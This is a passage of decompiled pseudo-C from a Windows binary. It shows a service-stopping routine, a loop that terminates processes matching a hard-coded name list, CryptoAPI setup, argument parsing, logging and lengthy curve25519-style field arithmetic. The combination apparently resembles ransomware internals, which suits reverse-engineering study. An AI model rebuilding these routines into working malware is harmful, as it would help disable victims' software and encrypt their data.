              if ( !QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded) )
                break;
            }
            while ( Buffer.dwCurrentState != 1 && GetTickCount() - TickCount <= v5 );
          }
        }
        CloseServiceHandle(hService);
      }
    }
    return (SC_HANDLE)CloseServiceHandle(hSCManager);
  }
  return result;
}

//----- (00404990) --------------------------------------------------------
BOOL sub_404990()
{
  PROCESSENTRY32W pe; // [esp+0h] [ebp-23Ch] BYREF
  BOOL i; // [esp+22Ch] [ebp-10h]
  HANDLE hSnapshot; // [esp+230h] [ebp-Ch]
  HANDLE hProcess; // [esp+234h] [ebp-8h]
  unsigned int j; // [esp+238h] [ebp-4h]

  hSnapshot = CreateToolhelp32Snapshot(0xFu, 0);
  pe.dwSize = 556;
  for ( i = Process32FirstW(hSnapshot, &pe); i; i = Process32NextW(hSnapshot, &pe) )
  {
    for ( j = 0; j < 0x1F; ++j )
    {
      if ( !lstrcmpW((&lpString1)[j], pe.szExeFile) )
      {
        hProcess = OpenProcess(1u, 0, pe.th32ProcessID);
        if ( hProcess )
        {
          TerminateProcess(hProcess, 9u);
          CloseHandle(hProcess);
        }
        break;
      }
    }
  }
  return CloseHandle(hSnapshot);
}

//----- (00404A60) --------------------------------------------------------
HCRYPTPROV sub_404A60()
{
  HCRYPTPROV phProv; // [esp+0h] [ebp-4h] BYREF

  phProv = 0;
  if ( !CryptAcquireContextW(&phProv, 0, 0, 0x18u, 0xF0000000)
    && !CryptAcquireContextW(&phProv, 0, 0, 0x18u, 0xF0000008) )
  {
    return 0;
  }
  return phProv;
}

//----- (00404AB0) --------------------------------------------------------
int sub_404AB0()
{
  HMODULE ModuleHandleA; // eax
  HANDLE CurrentProcess; // eax
  BOOL (__stdcall *IsWow64Process)(HANDLE, PBOOL); // [esp+0h] [ebp-8h]
  int v4; // [esp+4h] [ebp-4h] BYREF

  v4 = 0;
  ModuleHandleA = GetModuleHandleA("kernel32.dll");
  IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(ModuleHandleA, "IsWow64Process");
  if ( IsWow64Process )
  {
    CurrentProcess = GetCurrentProcess();
    if ( !IsWow64Process(CurrentProcess, &v4) )
      return 0;
  }
  return v4;
}

//----- (00404B00) --------------------------------------------------------
char __cdecl sub_404B00(int a1, int a2, _WORD *a3)
{
  int i; // [esp+0h] [ebp-8h]
  _WORD *v5; // [esp+4h] [ebp-4h]

  for ( i = 1; ; ++i )
  {
    if ( i >= a1 )
      return 0;
    v5 = *(_WORD **)(a2 + 4 * i);
    if ( *v5 == 45 )
      break;
  }
  while ( *v5 == 45 )
    ++v5;
  while ( *a3 && *a3 == *v5 )
  {
    ++a3;
    ++v5;
  }
  return 1;
}

//----- (00404C00) --------------------------------------------------------
_WORD *__cdecl sub_404C00(int a1, int a2, unsigned __int16 *a3)
{
  int v4; // [esp+0h] [ebp-Ch]
  int i; // [esp+4h] [ebp-8h]
  _WORD *v6; // [esp+8h] [ebp-4h]

  for ( i = 1; i < a1; ++i )
  {
    v6 = *(_WORD **)(a2 + 4 * i);
    v4 = 0;
    if ( *v6 == 45 )
    {
      while ( *v6 == 45 )
        ++v6;
      while ( *v6 != 61 )
      {
        if ( (unsigned __int16)*v6 != *a3 )
          ++v4;
        ++v6;
        ++a3;
      }
      if ( !v4 )
        return v6 + 1;
    }
  }
  return 0;
}

//----- (00404CB0) --------------------------------------------------------
void __cdecl sub_404CB0(LPCSTR lpString, LPCSTR a2, int a3)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  CHAR String[20]; // [esp+0h] [ebp-18h] BYREF
  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-4h] BYREF

  EnterCriticalSection(&CriticalSection);
  wsprintfA(String, "%lu", a3);
  v3 = lstrlenA(lpString);
  WriteFile(hObject, lpString, v3, &NumberOfBytesWritten, 0);
  WriteFile(hObject, ", Error Code: ", 0xEu, &NumberOfBytesWritten, 0);
  v4 = lstrlenA(String);
  WriteFile(hObject, String, v4, &NumberOfBytesWritten, 0);
  WriteFile(hObject, " -> ", 4u, &NumberOfBytesWritten, 0);
  v5 = lstrlenA(a2);
  WriteFile(hObject, a2, v5, &NumberOfBytesWritten, 0);
  WriteFile(hObject, "\r\n", 2u, &NumberOfBytesWritten, 0);
  LeaveCriticalSection(&CriticalSection);
}

//----- (00404DA0) --------------------------------------------------------
HANDLE __cdecl sub_404DA0(LPCWSTR lpFileName)
{
  HANDLE result; // eax

  InitializeCriticalSection(&CriticalSection);
  result = CreateFileW(lpFileName, 0x40000000u, 1u, 0, 4u, 0x80u, 0);
  hObject = result;
  return result;
}

//----- (00404DE0) --------------------------------------------------------
BOOL sub_404DE0()
{
  DeleteCriticalSection(&CriticalSection);
  return CloseHandle(hObject);
}

//----- (00404E00) --------------------------------------------------------
int __cdecl sub_404E00(int a1, int a2, unsigned __int8 *a3)
{
  int v4[20]; // [esp+0h] [ebp-16Ch] BYREF
  int v5[20]; // [esp+50h] [ebp-11Ch] BYREF
  int v6[20]; // [esp+A0h] [ebp-CCh] BYREF
  int v7[22]; // [esp+F0h] [ebp-7Ch] BYREF
  char v8[31]; // [esp+148h] [ebp-24h] BYREF
  char v9; // [esp+167h] [ebp-5h]
  int i; // [esp+168h] [ebp-4h]

  for ( i = 0; i < 32; ++i )
    v8[i] = *(_BYTE *)(i + a2);
  v8[0] &= 0xF8u;
  v9 = v9 & 0x3F | 0x40;
  sub_407B90(v6, a3);
  sub_408F40((int)v4, (int)v7, (int)v8, v6);
  sub_409270((int)v5, v7);
  sub_406DE0((int)v7, v4, v5);
  sub_408170(a1, (int)v7);
  return 0;
}
// 404E00: using guessed type char var_24[31];
// 404E00: using guessed type int var_CC[20];
// 404E00: using guessed type int var_7C[22];
// 404E00: using guessed type int var_16C[20];
// 404E00: using guessed type int var_11C[20];

//----- (00404F00) --------------------------------------------------------
unsigned int __cdecl sub_404F00(int a1, int a2)
{
  unsigned int result; // eax
  unsigned int i; // [esp+8h] [ebp-4h]

  for ( i = 0; i < 0xA; i += 2 )
  {
    *(_QWORD *)(a1 + 8 * i) += *(_QWORD *)(a2 + 8 * i);
    *(_QWORD *)(a1 + 8 * i + 8) += *(_QWORD *)(a2 + 8 * i + 8);
    result = i + 2;
  }
  return result;
}

//----- (00404F80) --------------------------------------------------------
unsigned int __cdecl sub_404F80(int a1, int a2)
{
  unsigned int result; // eax
  unsigned int i; // [esp+8h] [ebp-4h]

  for ( i = 0; i < 0xA; ++i )
  {
    *(_QWORD *)(a1 + 8 * i) = *(_QWORD *)(a2 + 8 * i) - *(_QWORD *)(a1 + 8 * i);
    result = i + 1;
  }
  return result;
}

//----- (00404FD0) --------------------------------------------------------
void __cdecl sub_404FD0(int a1, int a2, __int64 a3)
{
  unsigned int i; // [esp+4h] [ebp-4h]

  for ( i = 0; i < 0xA; ++i )
    *(_QWORD *)(a1 + 8 * i) = sub_413040(*(_QWORD *)(a2 + 8 * i), a3);
}

//----- (00405020) --------------------------------------------------------
unsigned __int64 __cdecl sub_405020(unsigned __int64 *a1, int *a2, int *a3)
{
  unsigned __int64 v3; // rax
  __int64 v4; // rax
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // kr00_8
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // kr08_8
  unsigned __int64 v9; // kr10_8
  unsigned __int64 v10; // kr18_8
  unsigned __int64 v11; // kr20_8
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // kr28_8
  unsigned __int64 v14; // kr30_8
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // kr38_8
  unsigned __int64 v17; // kr40_8
  unsigned __int64 v18; // kr48_8
  unsigned __int64 v19; // kr50_8
  unsigned __int64 v20; // rax
  unsigned __int64 v21; // kr58_8
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // rax
  unsigned __int64 v24; // kr60_8
  unsigned __int64 v25; // kr68_8
  unsigned __int64 v26; // kr70_8
  unsigned __int64 v27; // rax
  unsigned __int64 v28; // kr78_8
  unsigned __int64 v29; // kr80_8
  unsigned __int64 v30; // kr88_8
  unsigned __int64 v31; // kr90_8
  unsigned __int64 v32; // kr98_8
  unsigned __int64 v33; // krA0_8
  unsigned __int64 v34; // krA8_8
  unsigned __int64 v35; // rax
  unsigned __int64 v36; // krB0_8
  unsigned __int64 v37; // krB8_8
  unsigned __int64 v38; // rax
  unsigned __int64 v39; // krC0_8
  unsigned __int64 v40; // krC8_8
  unsigned __int64 v41; // krD0_8
  unsigned __int64 v42; // krD8_8
  unsigned __int64 v43; // rax
  unsigned __int64 v44; // krE0_8
  unsigned __int64 v45; // krE8_8
  unsigned __int64 v46; // krF0_8
  unsigned __int64 v47; // krF8_8
  unsigned __int64 v48; // kr100_8
  unsigned __int64 v49; // kr108_8
  unsigned __int64 v50; // kr110_8
  unsigned __int64 v51; // kr118_8
  unsigned __int64 v52; // rax
  unsigned __int64 v53; // kr120_8
  unsigned __int64 v54; // kr128_8
  unsigned __int64 v55; // kr130_8
  unsigned __int64 v56; // rax
  unsigned __int64 v57; // rax
  unsigned __int64 v58; // kr138_8
  unsigned __int64 v59; // kr140_8
  unsigned __int64 v60; // kr148_8
  unsigned __int64 v61; // rax
  unsigned __int64 v62; // kr150_8
  unsigned __int64 v63; // kr158_8
  unsigned __int64 v64; // kr160_8
  unsigned __int64 v65; // kr168_8
  unsigned __int64 v66; // kr170_8
  unsigned __int64 v67; // kr178_8
  unsigned __int64 v68; // kr180_8
  unsigned __int64 v69; // rax
  unsigned __int64 v70; // kr188_8
  unsigned __int64 v71; // kr190_8
  unsigned __int64 v72; // rax
  unsigned __int64 v73; // kr198_8
  unsigned __int64 v74; // kr1A0_8
  unsigned __int64 v75; // rax
  unsigned __int64 v76; // kr1A8_8
  unsigned __int64 v77; // kr1B0_8
  unsigned __int64 v78; // kr1B8_8
  unsigned __int64 v79; // kr1C0_8
  unsigned __int64 v80; // rax
  unsigned __int64 v81; // kr1C8_8
  unsigned __int64 v82; // rax
  unsigned __int64 v83; // rax
  unsigned __int64 v84; // kr1D0_8
  unsigned __int64 v85; // rax
  unsigned __int64 v86; // kr1D8_8
  unsigned __int64 v87; // kr1E0_8
  unsigned __int64 v88; // kr1E8_8
  unsigned __int64 v89; // kr1F0_8
  unsigned __int64 v90; // rax
  unsigned __int64 v91; // rax
  __int64 v92; // rax
  unsigned __int64 result; // rax

  *a1 = sub_413040(*a2, *a3);
  v3 = sub_413040(*a2, a3[2]);
  a1[1] = sub_413040(a2[2], *a3) + v3;
  v4 = sub_413040(a2[2], 2i64);
  v5 = sub_413040(v4, a3[2]);
  v6 = sub_413040(*a2, a3[4]) + v5;
  a1[2] = sub_413040(a2[4], *a3) + v6;
  v7 = sub_413040(a2[2], a3[4]);
  v8 = sub_413040(a2[4], a3[2]) + v7;
  v9 = sub_413040(*a2, a3[6]) + v8;
  a1[3] = sub_413040(a2[6], *a3) + v9;
  v10 = sub_413040(a2[4], a3[4]);
  v11 = sub_413040(a2[2], a3[6]);
  v12 = sub_413040(a2[6], a3[2]);
  v13 = sub_413040(v12 + v11, 2i64) + v10;
  v14 = sub_413040(*a2, a3[8]) + v13;
  a1[4] = sub_413040(a2[8], *a3) + v14;
  v15 = sub_413040(a2[4], a3[6]);
  v16 = sub_413040(a2[6], a3[4]) + v15;
  v17 = sub_413040(a2[2], a3[8]) + v16;
  v18 = sub_413040(a2[8], a3[2]) + v17;
  v19 = sub_413040(*a2, a3[10]) + v18;
  a1[5] = sub_413040(a2[10], *a3) + v19;
  v20 = sub_413040(a2[6], a3[6]);
  v21 = sub_413040(a2[2], a3[10]) + v20;
  v22 = sub_413040(a2[10], a3[2]);
  v23 = sub_413040(v22 + v21, 2i64);
  v24 = sub_413040(a2[4], a3[8]) + v23;
  v25 = sub_413040(a2[8], a3[4]) + v24;
  v26 = sub_413040(*a2, a3[12]) + v25;
  a1[6] = sub_413040(a2[12], *a3) + v26;
  v27 = sub_413040(a2[6], a3[8]);
  v28 = sub_413040(a2[8], a3[6]) + v27;
  v29 = sub_413040(a2[4], a3[10]) + v28;
  v30 = sub_413040(a2[10], a3[4]) + v29;
  v31 = sub_413040(a2[2], a3[12]) + v30;
  v32 = sub_413040(a2[12], a3[2]) + v31;
  v33 = sub_413040(*a2, a3[14]) + v32;
  a1[7] = sub_413040(a2[14], *a3) + v33;
  v34 = sub_413040(a2[8], a3[8]);
  v35 = sub_413040(a2[6], a3[10]);
  v36 = sub_413040(a2[10], a3[6]) + v35;
  v37 = sub_413040(a2[2], a3[14]) + v36;
  v38 = sub_413040(a2[14], a3[2]);
  v39 = sub_413040(v38 + v37, 2i64) + v34;
  v40 = sub_413040(a2[4], a3[12]) + v39;
  v41 = sub_413040(a2[12], a3[4]) + v40;
  v42 = sub_413040(*a2, a3[16]) + v41;
  a1[8] = sub_413040(a2[16], *a3) + v42;
  v43 = sub_413040(a2[8], a3[10]);
  v44 = sub_413040(a2[10], a3[8]) + v43;
  v45 = sub_413040(a2[6], a3[12]) + v44;
  v46 = sub_413040(a2[12], a3[6]) + v45;
  v47 = sub_413040(a2[4], a3[14]) + v46;
  v48 = sub_413040(a2[14], a3[4]) + v47;
  v49 = sub_413040(a2[2], a3[16]) + v48;
  v50 = sub_413040(a2[16], a3[2]) + v49;
  v51 = sub_413040(*a2, a3[18]) + v50;
  a1[9] = sub_413040(a2[18], *a3) + v51;
  v52 = sub_413040(a2[10], a3[10]);
  v53 = sub_413040(a2[6], a3[14]) + v52;
  v54 = sub_413040(a2[14], a3[6]) + v53;
  v55 = sub_413040(a2[2], a3[18]) + v54;
  v56 = sub_413040(a2[18], a3[2]);
  v57 = sub_413040(v56 + v55, 2i64);
  v58 = sub_413040(a2[8], a3[12]) + v57;
  v59 = sub_413040(a2[12], a3[8]) + v58;
  v60 = sub_413040(a2[4], a3[16]) + v59;
  a1[10] = sub_413040(a2[16], a3[4]) + v60;
  v61 = sub_413040(a2[10], a3[12]);
  v62 = sub_413040(a2[12], a3[10]) + v61;
  v63 = sub_413040(a2[8], a3[14]) + v62;
  v64 = sub_413040(a2[14], a3[8]) + v63;
  v65 = sub_413040(a2[6], a3[16]) + v64;
  v66 = sub_413040(a2[16], a3[6]) + v65;
  v67 = sub_413040(a2[4], a3[18]) + v66;
  a1[11] = sub_413040(a2[18], a3[4]) + v67;
  v68 = sub_413040(a2[12], a3[12]);
  v69 = sub_413040(a2[10], a3[14]);
  v70 = sub_413040(a2[14], a3[10]) + v69;
  v71 = sub_413040(a2[6], a3[18]) + v70;
  v72 = sub_413040(a2[18], a3[6]);
  v73 = sub_413040(v72 + v71, 2i64) + v68;
  v74 = sub_413040(a2[8], a3[16]) + v73;
  a1[12] = sub_413040(a2[16], a3[8]) + v74;
  v75 = sub_413040(a2[12], a3[14]);
  v76 = sub_413040(a2[14], a3[12]) + v75;
  v77 = sub_413040(a2[10], a3[16]) + v76;
  v78 = sub_413040(a2[16], a3[10]) + v77;
  v79 = sub_413040(a2[8], a3[18]) + v78;
  a1[13] = sub_413040(a2[18], a3[8]) + v79;
  v80 = sub_413040(a2[14], a3[14]);
  v81 = sub_413040(a2[10], a3[18]) + v80;
  v82 = sub_413040(a2[18], a3[10]);
  v83 = sub_413040(v82 + v81, 2i64);
  v84 = sub_413040(a2[12], a3[16]) + v83;
  a1[14] = sub_413040(a2[16], a3[12]) + v84;
  v85 = sub_413040(a2[14], a3[16]);
  v86 = sub_413040(a2[16], a3[14]) + v85;
  v87 = sub_413040(a2[12], a3[18]) + v86;
  a1[15] = sub_413040(a2[18], a3[12]) + v87;
  v88 = sub_413040(a2[16], a3[16]);
  v89 = sub_413040(a2[14], a3[18]);
  v90 = sub_413040(a2[18], a3[14]);
  a1[16] = sub_413040(v90 + v89, 2i64) + v88;
  v91 = sub_413040(a2[16], a3[18]);
  a1[17] = sub_413040(a2[18], a3[16]) + v91;
  v92 = sub_413040(a2[18], 2i64);
  result = sub_413040(v92, a3[18]);
  a1[18] = result;
  return result;
}

//----- (004064B0) --------------------------------------------------------
int __cdecl sub_4064B0(_QWORD *a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 v18; // rax
  int result; // eax
  __int64 v20; // kr40_8

  LODWORD(v1) = sub_413080(a1[18], 4u);
  a1[8] += v1;
  LODWORD(v2) = sub_413080(a1[18], 1u);
  a1[8] += v2;
  a1[8] += a1[18];
  LODWORD(v3) = sub_413080(a1[17], 4u);
  a1[7] += v3;
  LODWORD(v4) = sub_413080(a1[17], 1u);
  a1[7] += v4;
  a1[7] += a1[17];
  LODWORD(v5) = sub_413080(a1[16], 4u);
  a1[6] += v5;
  LODWORD(v6) = sub_413080(a1[16], 1u);
  a1[6] += v6;
  a1[6] += a1[16];
  LODWORD(v7) = sub_413080(a1[15], 4u);
  a1[5] += v7;
  LODWORD(v8) = sub_413080(a1[15], 1u);
  a1[5] += v8;
  a1[5] += a1[15];
  LODWORD(v9) = sub_413080(a1[14], 4u);
  a1[4] += v9;
  LODWORD(v10) = sub_413080(a1[14], 1u);
  a1[4] += v10;
  a1[4] += a1[14];
  LODWORD(v11) = sub_413080(a1[13], 4u);
  a1[3] += v11;
  LODWORD(v12) = sub_413080(a1[13], 1u);
  a1[3] += v12;
  a1[3] += a1[13];
  LODWORD(v13) = sub_413080(a1[12], 4u);
  a1[2] += v13;
  LODWORD(v14) = sub_413080(a1[12], 1u);
  a1[2] += v14;
  a1[2] += a1[12];
  LODWORD(v15) = sub_413080(a1[11], 4u);
  a1[1] += v15;
  LODWORD(v16) = sub_413080(a1[11], 1u);
  a1[1] += v16;
  a1[1] += a1[11];
  LODWORD(v17) = sub_413080(a1[10], 4u);
  *a1 += v17;
  LODWORD(v18) = sub_413080(a1[10], 1u);
  *a1 += v18;
  v20 = a1[10] + *a1;
  result = HIDWORD(v20);
  *a1 = v20;
  return result;
}
// 4064DC: variable 'v1' is possibly undefined
// 406519: variable 'v2' is possibly undefined
// 40658C: variable 'v3' is possibly undefined
// 4065C9: variable 'v4' is possibly undefined
// 40663C: variable 'v5' is possibly undefined
// 406679: variable 'v6' is possibly undefined
// 4066EC: variable 'v7' is possibly undefined
// 406729: variable 'v8' is possibly undefined
// 40679C: variable 'v9' is possibly undefined
// 4067D9: variable 'v10' is possibly undefined
// 40684C: variable 'v11' is possibly undefined
// 406889: variable 'v12' is possibly undefined
// 4068FB: variable 'v13' is possibly undefined
// 406936: variable 'v14' is possibly undefined
// 4069A6: variable 'v15' is possibly undefined
// 4069E3: variable 'v16' is possibly undefined
// 406A56: variable 'v17' is possibly undefined
// 406A93: variable 'v18' is possibly undefined

//----- (00406AF0) --------------------------------------------------------
int __cdecl sub_406AF0(unsigned __int64 a1)
{
  signed int v2; // [esp+0h] [ebp-Ch]

  v2 = (unsigned int)((int)sub_4130D0(a1, 0x20u) >> 31) >> 6;
  return sub_4130A0(a1 + v2, 0x1Au);
}

//----- (00406B30) --------------------------------------------------------
int __cdecl sub_406B30(unsigned __int64 a1)
{
  signed int v2; // [esp+0h] [ebp-Ch]

  v2 = (unsigned int)((int)sub_4130D0(a1, 0x20u) >> 31) >> 7;
  return sub_4130A0(a1 + v2, 0x19u);
}

//----- (00406B70) --------------------------------------------------------
int __cdecl sub_406B70(int a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  int result; // eax
  __int64 v10; // [esp+8h] [ebp-14h]
  __int64 v11; // [esp+10h] [ebp-Ch]
  __int64 v12; // [esp+10h] [ebp-Ch]
  unsigned int i; // [esp+18h] [ebp-4h]

  *(_DWORD *)(a1 + 80) = 0;
  *(_DWORD *)(a1 + 84) = 0;
  for ( i = 0; i < 0xA; i += 2 )
  {
    LODWORD(v1) = sub_406AF0(*(_QWORD *)(a1 + 8 * i));
    v11 = v1;
    LODWORD(v2) = sub_413080(v1, 0x1Au);
    *(_QWORD *)(a1 + 8 * i) -= v2;
    *(_QWORD *)(a1 + 8 * i + 8) += v11;
    LODWORD(v3) = sub_406B30(*(_QWORD *)(a1 + 8 * i + 8));
    v12 = v3;
    LODWORD(v4) = sub_413080(v3, 0x19u);
    *(_QWORD *)(a1 + 8 * i + 8) -= v4;
    *(_QWORD *)(a1 + 8 * i + 16) += v12;
  }
  LODWORD(v5) = sub_413080(*(_QWORD *)(a1 + 80), 4u);
  *(_QWORD *)a1 += v5;
  LODWORD(v6) = sub_413080(*(_QWORD *)(a1 + 80), 1u);
  *(_QWORD *)a1 += v6;
  *(_QWORD *)a1 += *(_QWORD *)(a1 + 80);
  *(_DWORD *)(a1 + 80) = 0;
  *(_DWORD *)(a1 + 84) = 0;
  LODWORD(v7) = sub_406AF0(*(_QWORD *)a1);
  v10 = v7;
  LODWORD(v8) = sub_413080(v7, 0x1Au);
  *(_QWORD *)a1 -= v8;
  result = 8;
  *(_QWORD *)(a1 + 8) += v10;
  return result;
}
// 406BC5: variable 'v1' is possibly undefined
// 406BE1: variable 'v2' is possibly undefined
// 406C30: variable 'v3' is possibly undefined
// 406C4D: variable 'v4' is possibly undefined
// 406CB1: variable 'v5' is possibly undefined
// 406CEE: variable 'v6' is possibly undefined
// 406D70: variable 'v7' is possibly undefined
// 406D91: variable 'v8' is possibly undefined

//----- (00406DE0) --------------------------------------------------------
unsigned int __cdecl sub_406DE0(int a1, int *a2, int *a3)
{
  unsigned __int64 v4[19]; // [esp+0h] [ebp-98h] BYREF

  sub_405020(v4, a2, a3);
  sub_4064B0(v4);
  sub_406B70((int)v4);
  return sub_412DA0(a1, (int)v4, 0x50u);
}
// 406DE0: using guessed type unsigned __int64 var_98[19];

//----- (00406E40) --------------------------------------------------------
unsigned __int64 __cdecl sub_406E40(unsigned __int64 *a1, int *a2)
{
  __int64 v2; // rax
  unsigned __int64 v3; // kr00_8
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // kr08_8
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // kr10_8
  __int64 v8; // rax
  unsigned __int64 v9; // kr18_8
  __int64 v10; // rax
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // kr20_8
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rax
  unsigned __int64 v15; // kr28_8
  unsigned __int64 v16; // kr30_8
  __int64 v17; // rax
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // kr38_8
  unsigned __int64 v21; // kr40_8
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // kr48_8
  unsigned __int64 v24; // rax
  unsigned __int64 v25; // kr50_8
  unsigned __int64 v26; // kr58_8
  unsigned __int64 v27; // rax
  unsigned __int64 v28; // rax
  unsigned __int64 v29; // rax
  unsigned __int64 v30; // kr60_8
  unsigned __int64 v31; // kr68_8
  unsigned __int64 v32; // kr70_8
  unsigned __int64 v33; // rax
  unsigned __int64 v34; // rax
  unsigned __int64 v35; // kr78_8
  unsigned __int64 v36; // kr80_8
  unsigned __int64 v37; // kr88_8
  unsigned __int64 v38; // rax
  unsigned __int64 v39; // rax
  unsigned __int64 v40; // rax
  unsigned __int64 v41; // kr90_8
  unsigned __int64 v42; // kr98_8
  unsigned __int64 v43; // rax
  unsigned __int64 v44; // krA0_8
  unsigned __int64 v45; // krA8_8
  unsigned __int64 v46; // krB0_8
  unsigned __int64 v47; // rax
  unsigned __int64 v48; // rax
  unsigned __int64 v49; // rax
  unsigned __int64 v50; // krB8_8
  unsigned __int64 v51; // rax
  unsigned __int64 v52; // rax
  unsigned __int64 v53; // krC0_8
  __int64 v54; // rax
  unsigned __int64 v55; // rax
  unsigned __int64 v56; // krC8_8
  unsigned __int64 v57; // rax
  unsigned __int64 v58; // krD0_8
  __int64 v59; // rax
  __int64 v60; // rax
  __int64 v61; // rax
  unsigned __int64 result; // rax

  *a1 = sub_413040(*a2, *a2);
  v2 = sub_413040(*a2, 2i64);
  a1[1] = sub_413040(v2, a2[2]);
  v3 = sub_413040(a2[2], a2[2]);
  v4 = sub_413040(*a2, a2[4]);
  a1[2] = sub_413040(v4 + v3, 2i64);
  v5 = sub_413040(a2[2], a2[4]);
  v6 = sub_413040(*a2, a2[6]);
  a1[3] = sub_413040(v6 + v5, 2i64);
  v7 = sub_413040(a2[4], a2[4]);
  v8 = sub_413040(a2[2], 4i64);
  v9 = sub_413040(v8, a2[6]) + v7;
  v10 = sub_413040(*a2, 2i64);
  a1[4] = sub_413040(v10, a2[8]) + v9;
  v11 = sub_413040(a2[4], a2[6]);
  v12 = sub_413040(a2[2], a2[8]) + v11;
  v13 = sub_413040(*a2, a2[10]);
  a1[5] = sub_413040(v13 + v12, 2i64);
  v14 = sub_413040(a2[6], a2[6]);
  v15 = sub_413040(a2[4], a2[8]) + v14;
  v16 = sub_413040(*a2, a2[12]) + v15;
  v17 = sub_413040(a2[2], 2i64);
  v18 = sub_413040(v17, a2[10]);
  a1[6] = sub_413040(v18 + v16, 2i64);
  v19 = sub_413040(a2[6], a2[8]);
  v20 = sub_413040(a2[4], a2[10]) + v19;
  v21 = sub_413040(a2[2], a2[12]) + v20;
  v22 = sub_413040(*a2, a2[14]);
  a1[7] = sub_413040(v22 + v21, 2i64);
  v23 = sub_413040(a2[8], a2[8]);
  v24 = sub_413040(a2[4], a2[12]);
  v25 = sub_413040(*a2, a2[16]) + v24;
  v26 = sub_413040(a2[2], a2[14]);
  v27 = sub_413040(a2[6], a2[10]);
  v28 = sub_413040(v27 + v26, 2i64);
  a1[8] = sub_413040(v28 + v25, 2i64) + v23;
  v29 = sub_413040(a2[8], a2[10]);
  v30 = sub_413040(a2[6], a2[12]) + v29;
  v31 = sub_413040(a2[4], a2[14]) + v30;
  v32 = sub_413040(a2[2], a2[16]) + v31;
  v33 = sub_413040(*a2, a2[18]);
  a1[9] = sub_413040(v33 + v32, 2i64);
  v34 = sub_413040(a2[10], a2[10]);
  v35 = sub_413040(a2[8], a2[12]) + v34;
  v36 = sub_413040(a2[4], a2[16]) + v35;
  v37 = sub_413040(a2[6], a2[14]);
  v38 = sub_413040(a2[2], a2[18]);
  v39 = sub_413040(v38 + v37, 2i64);
  a1[10] = sub_413040(v39 + v36, 2i64);
  v40 = sub_413040(a2[10], a2[12]);
  v41 = sub_413040(a2[8], a2[14]) + v40;
  v42 = sub_413040(a2[6], a2[16]) + v41;
  v43 = sub_413040(a2[4], a2[18]);
  a1[11] = sub_413040(v43 + v42, 2i64);
  v44 = sub_413040(a2[12], a2[12]);
  v45 = sub_413040(a2[8], a2[16]);
  v46 = sub_413040(a2[10], a2[14]);
  v47 = sub_413040(a2[6], a2[18]);
  v48 = sub_413040(v47 + v46, 2i64);
  a1[12] = sub_413040(v48 + v45, 2i64) + v44;
  v49 = sub_413040(a2[12], a2[14]);
  v50 = sub_413040(a2[10], a2[16]) + v49;
  v51 = sub_413040(a2[8], a2[18]);
  a1[13] = sub_413040(v51 + v50, 2i64);
  v52 = sub_413040(a2[14], a2[14]);
  v53 = sub_413040(a2[12], a2[16]) + v52;
  v54 = sub_413040(a2[10], 2i64);
  v55 = sub_413040(v54, a2[18]);
  a1[14] = sub_413040(v55 + v53, 2i64);
  v56 = sub_413040(a2[14], a2[16]);
  v57 = sub_413040(a2[12], a2[18]);
  a1[15] = sub_413040(v57 + v56, 2i64);
  v58 = sub_413040(a2[16], a2[16]);
  v59 = sub_413040(a2[14], 4i64);
  a1[16] = sub_413040(v59, a2[18]) + v58;
  v60 = sub_413040(a2[16], 2i64);
  a1[17] = sub_413040(v60, a2[18]);
  v61 = sub_413040(a2[18], 2i64);
  result = sub_413040(v61, a2[18]);
  a1[18] = result;
  return result;
}

//----- (00407B30) --------------------------------------------------------
unsigned int __cdecl sub_407B30(int a1, int *a2)
{
  unsigned __int64 v3[19]; // [esp+0h] [ebp-98h] BYREF

  sub_406E40(v3, a2);
  sub_4064B0(v3);
  sub_406B70((int)v3);
  return sub_412DA0(a1, (int)v3, 0x50u);
}
// 407B30: using guessed type unsigned __int64 var_98[19];

//----- (00407B90) --------------------------------------------------------
int __cdecl sub_407B90(int *a1, unsigned __int8 *a2)
{
  int v2; // esi
  int v3; // esi
  int v4; // esi
  __int64 v5; // kr00_8
  int v6; // esi
  int v7; // edx
  int v8; // edi
  int v9; // esi
  int v10; // edx
  int v11; // edi
  __int64 v12; // rax
  int v13; // edx
  __int64 v14; // kr08_8
  int v15; // esi
  int v16; // edx
  int v17; // edi
  int v18; // esi
  int v19; // edx
  int v20; // edi
  __int64 v21; // rax
  int v22; // edx
  __int64 v23; // kr10_8
  int v24; // esi
  int v25; // edx
  int v26; // edi
  int v27; // esi
  int v28; // edx
  int v29; // edi
  __int64 v30; // rax
  int v31; // edx
  __int64 v32; // kr18_8
  int v33; // esi
  int v34; // edx
  int v35; // edi
  int v36; // esi
  int v37; // edx
  int v38; // edi
  __int64 v39; // rax
  int v40; // edx
  int v41; // esi
  int v42; // esi
  int v43; // esi
  __int64 v44; // kr20_8
  int v45; // esi
  int v46; // edx
  int v47; // edi
  int v48; // esi
  int v49; // edx
  int v50; // edi
  __int64 v51; // rax
  int v52; // edx
  __int64 v53; // kr28_8
  int v54; // esi
  int v55; // edx
  int v56; // edi
  int v57; // esi
  int v58; // edx
  int v59; // edi
  __int64 v60; // rax
  int v61; // edx
  __int64 v62; // kr30_8
  int v63; // esi
